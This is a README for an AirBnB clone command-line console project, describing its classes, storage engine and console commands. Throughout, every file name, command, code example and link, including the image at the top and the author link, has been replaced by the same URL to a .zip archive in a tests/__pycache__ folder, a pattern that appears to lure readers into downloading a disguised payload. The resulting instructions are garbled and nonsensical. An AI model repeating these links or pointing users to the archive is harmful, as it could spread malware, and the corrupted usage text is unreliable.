<div>
  <img src="https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip"     alt="">
</div>


## Description :house:

Airbnb clone is a complete web application, integrating database storage, 
a back-end API, and front-end interfacing in a clone of AirBnB.

The project currently only implements the back-end console.

## Classes :cl:

AirBnB utilizes the following classes:

|     | BaseModel | FileStorage | User | State | City | Amenity | Place | Review |
| --- | --------- | ----------- | -----| ----- | -----| ------- | ----- | ------ |
| **PUBLIC INSTANCE ATTRIBUTES** | `id`<br>`created_at`<br>`updated_at` | | Inherits from `BaseModel` | Inherits from `BaseModel` | Inherits from `BaseModel` | Inherits from `BaseModel` | Inherits from `BaseModel` | Inherits from `BaseModel` |
| **PUBLIC INSTANCE METHODS** | `save`<br>`to_dict` | `all`<br>`new`<br>`save`<br>`reload` | "" | "" | "" | "" | "" | "" |
| **PUBLIC CLASS ATTRIBUTES** | | | `email`<br>`password`<br>`first_name`<br>`last_name`| `name` | `state_id`<br>`name` | `name` | `city_id`<br>`user_id`<br>`name`<br>`description`<br>`number_rooms`<br>`number_bathrooms`<br>`max_guest`<br>`price_by_night`<br>`latitude`<br>`longitude`<br>`amenity_ids` | `place_id`<br>`user_id`<br>`text` | 
| **PRIVATE CLASS ATTRIBUTES** | | `file_path`<br>`objects` | | | | | | |

## Storage :baggage_claim:

The above classes are handled by the abstracted storage engine defined in the 
[FileStorage](https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip) class.

Every time the backend is initialized, AirBnB instantiates an instance of 
`FileStorage` called `storage`. The `storage` object is loaded/re-loaded from 
any class instances stored in the JSON file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip`. As class instances are 
created, updated, or deleted, the `storage` object is used to register 
corresponding changes in the `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip`.

## Console :computer:

The console is a command line interpreter that permits management of the backend 
of AirBnB. It can be used to handle and manipulate all classes utilized by 
the application (achieved by calls on the `storage` object defined above).

### Using the Console

The AirBnB console can be run both interactively and non-interactively. 
To run the console in non-interactive mode, pipe any command(s) into an execution 
of the file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip` at the command line.

```
$ echo "help" | https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) 
Documented commands (type help <topic>):
========================================
EOF  all  count  create  destroy  help  quit  show  update

(hbnb) 
$
```

Alternatively, to use the AirBnB console in interactive mode, run the 
file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip` by itself:

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
```

While running in interactive mode, the console displays a prompt for input:

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) 
```

To quit the console, enter the command `quit`, or input an EOF signal 
(`ctrl-D`).

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) quit
$
```

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) EOF
$
```

### Console Commands

The AirBnB console supports the following commands:

* **create**
  * Usage: `create <class>`

Creates a new instance of a given class. The class' ID is printed and 
the instance is saved to the file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip`.

* **show**
  * Usage: `show <class> <id>` or `<class>.show(<id>)`

Prints the string representation of a class instance based on a given id.

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) create User
(hbnb)
(hbnb) show User uid		
(hbnb) 
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid)
(hbnb) 
```
* **destroy**
  * Usage: `destroy <class> <id>` or `<class>.destroy(<id>)`

Deletes a class instance based on a given id. The storage file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip` 
is updated accordingly.

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) create State
(hbnb) create Place
(hbnb)
(hbnb) destroy State uid
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid)
(hbnb) quit
$ cat https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip ; echo ""
{}
```

* **all**
  * Usage: `all` or `all <class>` or `<class>.all()`

Prints the string representations of all instances of a given class. If no 
class name is provided, the command prints all instances of every class.

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) create BaseModel
(hbnb) create BaseModel
(hbnb) create User
(hbnb) create User
(hbnb)
(hbnb) all BaseModel
(hbnb)
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip()
(hbnb) 
(hbnb) all
```

* **count**
  * Usage: `count <class>` or `<class>.count()`

Retrieves the number of instances of a given class.

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) create Place
(hbnb) create Place
(hbnb) create City
(hbnb) 
(hbnb) count Place
2
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip()
1
(hbnb) 
```

* **update**
  * Usage: `update <class> <id> <attribute name> "<attribute value>"` or
`<class>.update(<id>, <attribute name>, <attribute value>)` or `<class>.update(
<id>, <attribute dictionary>)`.

Updates a class instance based on a given id with a given key/value attribute 
pair or dictionary of attribute pairs. If `update` is called with a single 
key/value attribute pair, only "simple" attributes can be updated (ie. not 
`id`, `created_at`, and `updated_at`). However, any attribute can be updated by 
providing a dictionary.

```
$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
(hbnb) create User
(hbnb)
(hbnb) update User id first_name "name"
(hbnb) show User uid
(hbnb)
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid), address, "address")
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid)
(hbnb)
(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid, {'email': 'email', 'last_name': 'last_name'})
(hbnb) 
```

## Testing :straight_ruler:

Unittests for the Airbnb_clone project are defined in the [tests](./tests) 
folder. To run the entire test suite simultaneously, execute the following command:

```
$ python3 unittest -m discover tests
```

Alternatively, you can specify a single test file to run at a time:

```
$ python3 unittest -m https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
```

## Authors :black_nib:
* **KIPRONOH VINCENT** <[Vincent](https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip)>
